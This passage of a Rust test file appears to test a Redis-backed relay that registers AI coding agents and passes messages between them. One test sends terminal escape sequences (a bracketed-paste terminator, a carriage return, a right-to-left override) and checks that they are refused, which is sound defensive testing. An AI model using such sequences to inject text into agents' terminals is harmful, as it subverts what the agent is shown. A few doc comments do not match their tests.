    })
    .unwrap();

    let named = r.probe_session(&"sid-1".parse().unwrap()).unwrap();
    assert_eq!(named.name, Some(name("qsl")));
    assert!(!named.suppressed);
    let fork = r.probe_session(&"sid-fork".parse().unwrap()).unwrap();
    assert!(fork.suppressed && fork.name.is_none());

    // A key of the wrong type reads as absent instead of failing the probe.
    let url = std::env::var("IX_RELAY_TEST_URL").unwrap();
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let () = redis::cmd("LPUSH")
        .arg(format!(
            "test:{}:probe-session:session:sid-bad",
            std::process::id()
        ))
        .arg("x")
        .query(&mut raw)
        .unwrap();
    let bad = r.probe_session(&"sid-bad".parse().unwrap()).unwrap();
    assert_eq!(bad, relay_core::SessionProbe::default());
}

/// An empty commit writes nothing at all.
#[test]
fn session_and_suppression_keys_expire_after_thirty_days() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!("skipping session_and_suppression_keys_expire: IX_RELAY_TEST_URL unset");
        return;
    };
    let prefix = format!("test:{}:commit-ttl:", std::process::id());
    let mut r = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    r.commit_identity(&IdentityCommit {
        session_name: Some(("sid-1".parse().unwrap(), name("qsl"))),
        suppress_session: Some("sid-fork".parse().unwrap()),
        registration: None,
    })
    .unwrap();
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let thirty_days: i64 = 30 * 24 * 60 * 60;
    for key in ["session:sid-1", "suppressed:sid-fork"] {
        let ttl: i64 = redis::cmd("TTL")
            .arg(format!("{prefix}{key}"))
            .query(&mut raw)
            .unwrap();
        assert!(
            (thirty_days - 60..=thirty_days).contains(&ttl),
            "{key} ttl {ttl}"
        );
    }
}

/// A reader that checks, atomically, that a registered lead always has its
/// session cached sees no half-applied commit while another connection
/// commits identities one after another. A commit made of separate commands
/// (registration first, cache second) is caught by this with high
/// probability; Redis cannot roll a script back, so a forced mid-script
/// failure is not a usable test.
#[test]
fn commit_identity_is_never_observed_half_applied() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!(
            "skipping commit_identity_is_never_observed_half_applied: IX_RELAY_TEST_URL unset"
        );
        return;
    };
    let prefix = format!("test:{}:commit-atomic:", std::process::id());
    let mut writer = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let reader = {
        let stop = std::sync::Arc::clone(&stop);
        let url = url.clone();
        let prefix = prefix.clone();
        thread::spawn(move || {
            let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
            let mut torn = 0u32;
            let mut checks = 0u32;
            while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                for i in 0..200 {
                    let (registered, cached): (bool, bool) = redis::pipe()
                        .atomic()
                        .hexists(format!("{prefix}agents"), format!("lead-{i}"))
                        .exists(format!("{prefix}session:sid-{i}"))
                        .query(&mut raw)
                        .unwrap();
                    checks += 1;
                    if registered != cached {
                        torn += 1;
                    }
                }
            }
            (torn, checks)
        })
    };
    for i in 0..200 {
        writer
            .commit_identity(&IdentityCommit {
                registration: Some(reg_at(&format!("lead-{i}"), &format!("sid-{i}"), "w1:p1")),
                session_name: Some((
                    format!("sid-{i}").parse().unwrap(),
                    name(&format!("lead-{i}")),
                )),
                ..IdentityCommit::default()
            })
            .unwrap();
    }
    stop.store(true, std::sync::atomic::Ordering::Relaxed);
    let (torn, checks) = reader.join().unwrap();
    assert!(checks > 0);
    assert_eq!(
        torn, 0,
        "{torn} of {checks} reads saw a half-applied commit"
    );
}

// ---- hook health stream (AGE-2033) ----------------------------------------

fn health_entry(n: usize) -> HookHealthEntry {
    HookHealthEntry {
        id: Some(format!("id-{n}")),
        machine: "hub".parse().unwrap(),
        lead: n.is_multiple_of(2).then(|| "qsl-lead".to_owned()),
        record: format!("{{\"n\":{n}}}"),
    }
}

#[test]
fn hook_health_round_trips_records_with_their_machine_and_lead_in_order() {
    let Some(mut r) = relay("health-round-trip") else {
        return;
    };
    assert!(r.hook_health(10).unwrap().entries.is_empty());
    let entries: Vec<HookHealthEntry> = (0..3).map(health_entry).collect();
    r.push_hook_health(&entries).unwrap();
    assert_eq!(r.hook_health(10).unwrap().entries, entries);
    // Pushing nothing is a no-op, not an error.
    r.push_hook_health(&[]).unwrap();
    assert_eq!(r.hook_health(10).unwrap().entries, entries);
}

/// A raw connection to the test Redis, for looking at what the store wrote.
fn raw(test: &str) -> Option<(redis::Connection, String)> {
    let url = std::env::var("IX_RELAY_TEST_URL").ok()?;
    let conn = redis::Client::open(url).unwrap().get_connection().unwrap();
    Some((conn, format!("test:{}:{test}:", std::process::id())))
}

/// Tracing: TC-030-12
/// ACs: FR-030-AC-12
///
/// A record offered again is skipped by its id, in the same request that adds the new ones:
/// pushing the same entries twice, and pushing an overlapping chunk, leave each id on the
/// stream once; the call says how many it added.
#[test]
fn tc_030_12_a_record_id_reaches_the_stream_once_however_often_it_is_offered() {
    let Some(mut r) = relay("health-once") else {
        return;
    };
    let first: Vec<HookHealthEntry> = (0..5).map(health_entry).collect();
    assert_eq!(r.push_hook_health(&first).unwrap(), 5);
    assert_eq!(
        r.push_hook_health(&first).unwrap(),
        0,
        "all already shipped"
    );
    let overlap: Vec<HookHealthEntry> = (3..8).map(health_entry).collect();
    assert_eq!(
        r.push_hook_health(&overlap).unwrap(),
        3,
        "only 5, 6 and 7 are new"
    );
    let all = r.hook_health(100).unwrap();
    let ids: Vec<&str> = all.entries.iter().filter_map(|e| e.id.as_deref()).collect();
    assert_eq!(
        ids,
        [
            "id-0", "id-1", "id-2", "id-3", "id-4", "id-5", "id-6", "id-7"
        ]
    );
    // Records that look alike are distinct records with distinct ids: both are kept.
    let alike = |id: &str| HookHealthEntry {
        id: Some(id.into()),
        ..health_entry(0)
    };
    assert_eq!(r.push_hook_health(&[alike("a"), alike("b")]).unwrap(), 2);
    // A chunk that repeats an id within itself adds it once.
    assert_eq!(r.push_hook_health(&[alike("c"), alike("c")]).unwrap(), 1);
}

/// Tracing: TC-030-12
/// ACs: FR-030-AC-12
///
/// Two ships racing with the same records add each once.
#[test]
fn tc_030_12_two_overlapping_ships_add_each_record_once() {
    let Some(mut r) = relay("health-race") else {
        return;
    };
    let url = std::env::var("IX_RELAY_TEST_URL").unwrap();
    let prefix = format!("test:{}:health-race:", std::process::id());
    let entries: Vec<HookHealthEntry> = (0..300).map(health_entry).collect();
    let handles: Vec<_> = (0..2)
        .map(|_| {
            let (url, prefix, entries) = (url.clone(), prefix.clone(), entries.clone());
            thread::spawn(move || {
                let mut other = Relay::connect(&url, Duration::from_secs(5))
                    .unwrap()
                    .with_prefix(prefix);
                for chunk in entries.chunks(50) {
                    other.push_hook_health(chunk).unwrap();
                }
            })
        })
        .collect();
    for h in handles {
        h.join().unwrap();
    }
    let read = r.hook_health(1_000).unwrap();
    assert_eq!(read.entries.len(), 300, "each id once");
    assert_eq!(read.distinct().len(), 300);
}

/// The record of shipped ids is bounded (NFR-002): past 2,000 ids the oldest are
/// forgotten, and an entry with no id is always added.
#[test]
fn the_record_of_shipped_ids_is_bounded() {
    let Some(mut r) = relay("health-bounded") else {
        return;
    };
    let entries: Vec<HookHealthEntry> = (0..2_300).map(health_entry).collect();
    for chunk in entries.chunks(200) {
        r.push_hook_health(chunk).unwrap();
    }
    let (mut conn, prefix) = raw("health-bounded").unwrap();
    let kept: usize = redis::cmd("ZCARD")
        .arg(format!("{prefix}health:hooks-shipped"))
        .query(&mut conn)
        .unwrap();
    assert_eq!(kept, 2_000);
    let ttl: i64 = redis::cmd("PTTL")
        .arg(format!("{prefix}health:hooks-shipped"))
        .query(&mut conn)
        .unwrap();
    assert!(ttl > 0 && ttl <= 24 * 60 * 60 * 1000, "{ttl}");
    let anonymous = HookHealthEntry {
        id: None,
        ..health_entry(1)
    };
    assert_eq!(
        r.push_hook_health(&[anonymous.clone(), anonymous]).unwrap(),
        2
    );
}

/// The reader counts an id once: a stream that holds one id twice (it aged out of the
/// shipped record in between) is one record.
#[test]
fn a_reader_counts_a_record_id_once() {
    let Some((mut conn, prefix)) = raw("health-distinct") else {
        return;
    };
    let mut r = relay("health-distinct").unwrap();
    for _ in 0..2 {
        let _id: String = redis::cmd("XADD")
            .arg(format!("{prefix}health:hooks"))
            .arg("*")
            .arg("machine")
            .arg("hub")
            .arg("lead")
            .arg("")
            .arg("id")
            .arg("same")
            .arg("rec")
            .arg("{}")
            .query(&mut conn)
            .unwrap();
    }
    let read = r.hook_health(10).unwrap();
    assert_eq!(read.entries.len(), 2);
    assert_eq!(read.distinct().len(), 1);
}

/// The stream is capped: a flood keeps roughly the newest entries, never all.
#[test]
fn hook_health_is_capped() {
    let Some(mut r) = relay("health-capped") else {
        return;
    };
    let entries: Vec<HookHealthEntry> = (0..3_000).map(health_entry).collect();
    r.push_hook_health(&entries).unwrap();
    let kept = r.hook_health(10_000).unwrap().entries;
    assert!(kept.len() < entries.len(), "kept {}", kept.len());
    assert!(kept.len() >= 1_000, "kept {}", kept.len());
    assert_eq!(kept.last(), entries.last(), "the newest survives");
}

// ---- registrations_for_pane (AGE-2018 PR review, finding 4) --------------

#[test]
fn registrations_for_pane_returns_the_most_recently_seen_first() {
    let Some(mut r) = relay("regs-for-pane") else {
        return;
    };
    r.register(&Registration {
        place: None,
        last_seen_ms: 10,
        ..reg_at("older", "sid-old", "w1:p1")
    })
    .unwrap();
    r.register(&Registration {
        place: None,
        last_seen_ms: 20,
        ..reg_at("newer", "sid-new", "w1:p1")
    })
    .unwrap();
    let regs = r
        .registrations_for_pane(&PaneRef::new(
            "node-a".parse().unwrap(),
            "w1:p1".parse().unwrap(),
        ))
        .unwrap();
    assert_eq!(regs.len(), 2);
    assert_eq!(regs[0].name, name("newer"));
    assert_eq!(regs[1].name, name("older"));
}

#[test]
fn registrations_for_pane_is_empty_for_an_unknown_pane() {
    let Some(mut r) = relay("regs-for-pane-unknown") else {
        return;
    };
    register(&mut r, "qsl");
    assert!(
        r.registrations_for_pane(&PaneRef::new(
            "node-a".parse().unwrap(),
            "w9:p9".parse().unwrap()
        ))
        .unwrap()
        .is_empty()
    );
}

/// AGE-2026: pane ids repeat across machines, so a pane lookup is scoped by
/// machine (normalized on both sides) and never returns another machine's lead.
#[test]
fn registrations_for_pane_is_scoped_to_the_machine() {
    let Some(mut r) = relay("regs-for-pane-machine") else {
        return;
    };
    r.register(&Registration {
        machine: "hub".parse().unwrap(),
        ..reg_at("hub-lead", "sid-l", "w1:p1")
    })
    .unwrap();
    r.register(&Registration {
        machine: "node-a".parse().unwrap(),
        ..reg_at("node-a-lead", "sid-t", "w1:p1")
    })
    .unwrap();
    let names = |regs: Vec<Registration>| regs.into_iter().map(|r| r.name).collect::<Vec<_>>();
    assert_eq!(
        names(
            r.registrations_for_pane(&PaneRef::new(
                "hub".parse().unwrap(),
                "w1:p1".parse().unwrap()
            ))
            .unwrap()
        ),
        [name("hub-lead")]
    );
    assert_eq!(
        names(
            r.registrations_for_pane(&PaneRef::new(
                "Node-A.local".parse().unwrap(),
                "w1:p1".parse().unwrap()
            ))
            .unwrap()
        ),
        [name("node-a-lead")]
    );
    assert!(
        r.registrations_for_pane(&PaneRef::new(
            "node-b".parse().unwrap(),
            "w1:p1".parse().unwrap()
        ))
        .unwrap()
        .is_empty()
    );
}

// ---- mixed-version registries (AGE-2026) ----------------------------------

/// A record with a field this binary does not know still decodes, and a
/// corrupt record is reported instead of failing the whole listing.
#[test]
fn agents_returns_the_decodable_registrations_and_reports_the_rest() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!("skipping agents_returns_the_decodable_registrations: IX_RELAY_TEST_URL unset");
        return;
    };
    let prefix = format!("test:{}:agents-skip:", std::process::id());
    let mut r = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    register(&mut r, "plain-lead");

    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let mut put = |field: &str, json: &str| {
        let _: () = redis::cmd("HSET")
            .arg(format!("{prefix}agents"))
            .arg(field)
            .arg(json)
            .query(&mut raw)
            .unwrap();
    };
    put(
        "newer-lead",
        r#"{"name":"newer-lead","machine":"hub","kind":"claude","session_id":null,
            "cwd":null,"last_seen_ms":1,"from_the_future":true,
            "place":{"workspace":"EA","tab":"1","tabs_in_workspace":1,"pinned":true}}"#,
    );
    put("broken-lead", "{not json");

    let listed = r.agents().unwrap();
    assert_eq!(
        listed
            .registrations
            .iter()
            .map(|a| a.name.as_str())
            .collect::<Vec<_>>(),
        ["newer-lead", "plain-lead"]
    );
    assert_eq!(listed.skipped.len(), 1);
    assert_eq!(listed.skipped[0].field, "broken-lead");
    assert!(matches!(listed.skipped[0].error, Error::Decode { .. }));
    // Lookups by pane read through the same tolerant path.
    assert!(
        r.registrations_for_pane(&PaneRef::new(
            "hub".parse().unwrap(),
            "w1:p1".parse().unwrap()
        ))
        .unwrap()
        .is_empty()
    );
}

/// AGE-2026: text an agent cannot safely be shown is refused, not queued.
#[test]
fn send_refuses_text_with_an_escape_or_carriage_return() {
    let Some(mut r) = relay("send-unsafe") else {
        return;
    };
    register(&mut r, "tl-lead");
    for (text, codepoint, offset) in [
        ("hi\u{1b}[201~", 0x1b_u32, 2_usize),
        ("a\rb", 0x0d, 1),
        ("x\u{202e}y", 0x202e, 1),
    ] {
        let err = r.send(&msg("qsl-lead", "tl-lead", text, 1)).unwrap_err();
        assert!(
            matches!(err, Error::UnsafeMessageText { codepoint: c, byte_offset: o }
                if c == codepoint && o == offset),
            "{text:?}: {err:?}"
        );
    }
    assert_eq!(r.inbox_len(&name("tl-lead")).unwrap(), 0);
    r.send(&msg("qsl-lead", "tl-lead", "plain\nmulti\tline", 1))
        .unwrap();
}

/// AGE-2026: an escalation id becomes part of a Redis key, so an index entry
/// that could alias another key (`seq`) is reported, never looked up.
#[test]
fn list_reports_an_index_entry_that_is_not_a_valid_escalation_id() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!("skipping list_reports_an_index_entry: IX_RELAY_TEST_URL unset");
        return;
    };
    let prefix = format!("test:{}:list-alias-id:", std::process::id());
    let mut r = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    let good = r.escalate(new_escalation("AGE-1", "qsl-lead")).unwrap();
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let _: () = redis::cmd("ZADD")
        .arg(format!("{prefix}esc:index"))
        .arg(1)
        .arg("seq")
        .query(&mut raw)
        .unwrap();

    let listed = r.list(None).unwrap();
    assert_eq!(listed.escalations.len(), 1);
    assert_eq!(listed.escalations[0].id, good.id);
    assert_eq!(listed.rejected.len(), 1);
    assert_eq!(listed.rejected[0].0, "seq");
    assert!(matches!(
        listed.rejected[0].1,
        Error::InvalidEscalationId { .. }
    ));
}

/// AGE-2026 review: refreshing a place must not erase members a newer binary
/// wrote into the registration.
#[test]
fn refresh_place_keeps_registration_members_this_binary_does_not_know() {
    let Ok(url) = std::env::var("IX_RELAY_TEST_URL") else {
        eprintln!("skipping refresh_place_keeps: IX_RELAY_TEST_URL unset");
        return;
    };
    let prefix = format!("test:{}:refresh-unknown:", std::process::id());
    let mut r = Relay::connect(&url, Duration::from_secs(2))
        .unwrap()
        .with_prefix(prefix.clone());
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let _: () = redis::cmd("HSET")
        .arg(format!("{prefix}agents"))
        .arg("newer-lead")
        .arg(r#"{"name":"newer-lead","machine":"hub","kind":"claude","session_id":null,"cwd":null,"last_seen_ms":1,"from_the_future":{"a":[1,2]}}"#)
        .query(&mut raw)
        .unwrap();
    let place = relay_core::Place {
        workspace: "EA".into(),
        tab: "code".into(),
        herdr_ids: None,
    };
    assert!(
        r.refresh_place(&name("newer-lead"), &place, 5, true)
            .unwrap()
            != PlaceRefresh::Unchanged
    );

    let stored: String = redis::cmd("HGET")
        .arg(format!("{prefix}agents"))
        .arg("newer-lead")
        .query(&mut raw)
        .unwrap();
    let value: serde_json::Value = serde_json::from_str(&stored).unwrap();
    assert_eq!(value["from_the_future"], serde_json::json!({"a": [1, 2]}));
    assert_eq!(value["place"]["workspace"], "EA");
    assert_eq!(
        r.agent(&name("newer-lead")).unwrap().unwrap().place,
        Some(place)
    );
}

// ---- prune (AGE-2018 PR review, finding 7) -------------------------------

#[test]
fn prune_of_an_unregistered_name_is_a_no_op() {
    let Some(mut r) = relay("prune-noop") else {
        return;
    };
    assert_eq!(r.prune(&name("never-registered"), 1).unwrap(), None);
}

/// AGE-2026 review: a lead that re-registers between the watcher's registry
/// snapshot and its prune keeps its fresh registration.
#[test]
fn a_session_starts_out_not_suppressed() {
    let Some(mut r) = relay("suppressed-default") else {
        return;
    };
    assert!(
        !r.probe_session(&"sid-1".parse().unwrap())
            .unwrap()
            .suppressed
    );
}

#[test]
fn remembering_a_session_as_suppressed_makes_is_suppressed_true() {
    let Some(mut r) = relay("suppressed-remember") else {
        return;
    };
    r.commit_identity(&IdentityCommit {
        suppress_session: Some("sid-1".parse().unwrap()),
        ..IdentityCommit::default()
    })
    .unwrap();
    assert!(
        r.probe_session(&"sid-1".parse().unwrap())
            .unwrap()
            .suppressed
    );
    // A different, never-suppressed session is unaffected.
    assert!(
        !r.probe_session(&"sid-2".parse().unwrap())
            .unwrap()
            .suppressed
    );
}

// ---- watcher wake-up primitives (AGE-2028) --------------------------------

/// Tracing: TC-038-01
/// ACs: FR-038-AC-1
///
/// One pipelined request answers every inbox length, in order, and a key of the
/// wrong type is that entry's error, not everyone's.
#[test]
fn inbox_lens_answers_every_lead_in_one_request_and_isolates_a_bad_key() {
    let Some(mut r) = relay("inbox-lens") else {
        return;
    };
    for lead in ["lens-a", "lens-b", "lens-c"] {
        register(&mut r, lead);
    }
    r.send(&msg("lens-a", "lens-b", "one", 1)).unwrap();
    r.send(&msg("lens-a", "lens-b", "two", 2)).unwrap();
    assert!(r.inbox_lens(&[]).unwrap().is_empty());

    let names = [name("lens-a"), name("lens-b"), name("lens-c")];
    let refs: Vec<&AgentName> = names.iter().collect();
    let lens: Vec<usize> = r
        .inbox_lens(&refs)
        .unwrap()
        .into_iter()
        .map(|len| len.unwrap())
        .collect();
    assert_eq!(lens, [0, 2, 0]);

    // A string where the inbox list should be: only that lead's entry fails.
    let url = std::env::var("IX_RELAY_TEST_URL").unwrap();
    let mut raw = redis::Client::open(url).unwrap().get_connection().unwrap();
    let () = redis::cmd("SET")
        .arg(format!(
            "test:{}:inbox-lens:inbox:lens-c",
            std::process::id()
        ))
        .arg("not a list")
        .query(&mut raw)
        .unwrap();
    let lens = r.inbox_lens(&refs).unwrap();
    assert_eq!(lens[1].as_ref().unwrap(), &2);
    assert!(lens[2].as_ref().is_err_and(|e| !e.is_connection()));
}

/// Tracing: TC-038-02
/// ACs: FR-038-AC-2
///
/// A wait started after the tail id was read returns for a send that came
/// after it, whether the send lands before or during the wait, and returns
/// `false` when nothing was sent.
#[test]
fn wait_for_log_returns_for_a_send_after_the_tail_and_not_otherwise() {
    let Some(mut r) = relay("wait-for-log") else {
        return;
    };
    register(&mut r, "wait-lead");
    r.send(&msg("wait-lead", "wait-lead", "old", 1)).unwrap();
    let tail = r.log_tail_id().unwrap();
    assert_ne!(tail, "0-0", "the log has the old entry");
    assert!(
        !r.wait_for_log(&tail, Duration::from_millis(50)).unwrap(),
        "nothing newer than the tail"
    );

    let url = std::env::var("IX_RELAY_TEST_URL").unwrap();
    let prefix = format!("test:{}:wait-for-log:", std::process::id());
    let sender = thread::spawn(move || {
        let mut other = Relay::connect(&url, Duration::from_secs(2))
            .unwrap()
            .with_prefix(prefix);
        other
            .send(&msg("wait-lead", "wait-lead", "new", 2))
            .unwrap();
    });
    assert!(
        r.wait_for_log(&tail, Duration::from_secs(5)).unwrap(),
        "woken by the send"
    );
    sender.join().unwrap();
    assert_ne!(r.log_tail_id().unwrap(), tail, "the tail moved");
    // The connection still works, with its own timeout back.
    assert_eq!(r.inbox_len(&name("wait-lead")).unwrap(), 2);
}

/// A fresh Redis has no log: the tail is the start of the stream.
#[test]
fn the_tail_of_an_empty_log_is_the_start() {
    let Some(mut r) = relay("empty-log-tail") else {
        return;
    };
    assert_eq!(r.log_tail_id().unwrap(), "0-0");
}

/// Tracing: TC-038-09
/// ACs: FR-038-AC-9
///
/// A requeue wakes a watcher blocked on the log (so an idle lead whose batch
/// was put back is looked at now, not at the next sweep), and the wake entry
/// never shows up as a message in the history.
#[test]
fn a_requeue_wakes_the_log_and_is_not_a_message() {
    let Some(mut r) = relay("requeue-wake") else {
        return;
    };
    register(&mut r, "rq-lead");
    r.send(&msg("rq-lead", "rq-lead", "once", 1)).unwrap();
    let popped = r.pop_inbox(&name("rq-lead"), MAX).unwrap();
    let tail = r.log_tail_id().unwrap();
    assert!(!r.wait_for_log(&tail, Duration::from_millis(50)).unwrap());
    r.requeue_front(&name("rq-lead"), &popped.messages).unwrap();
    assert!(
        r.wait_for_log(&tail, Duration::from_secs(2)).unwrap(),
        "woken"
    );
    assert_eq!(
        r.log(0, 10).unwrap().len(),
        1,
        "history holds the one message"
    );
    assert_eq!(r.inbox_len(&name("rq-lead")).unwrap(), 1);
}

// ---- the demotion compares the machine (AGE-2027 PR review, finding 4) ------

fn reg_at(name_str: &str, session_id: &str, pane: &str) -> Registration {
    Registration {
        name: name(name_str),
        machine: "node-a".parse().unwrap(),
        kind: "claude".into(),
        session_id: Some(session_id.parse().unwrap()),
        cwd: None,
        herdr_pane: Some(pane.parse().unwrap()),
        place: None,
        last_seen_ms: 1,
    }
}

fn remember_session(r: &mut Relay, session_id: &str, n: &str) {
    r.commit_identity(&IdentityCommit {
        session_name: Some((session_id.parse().unwrap(), name(n))),
        ..IdentityCommit::default()
    })
    .unwrap();
}
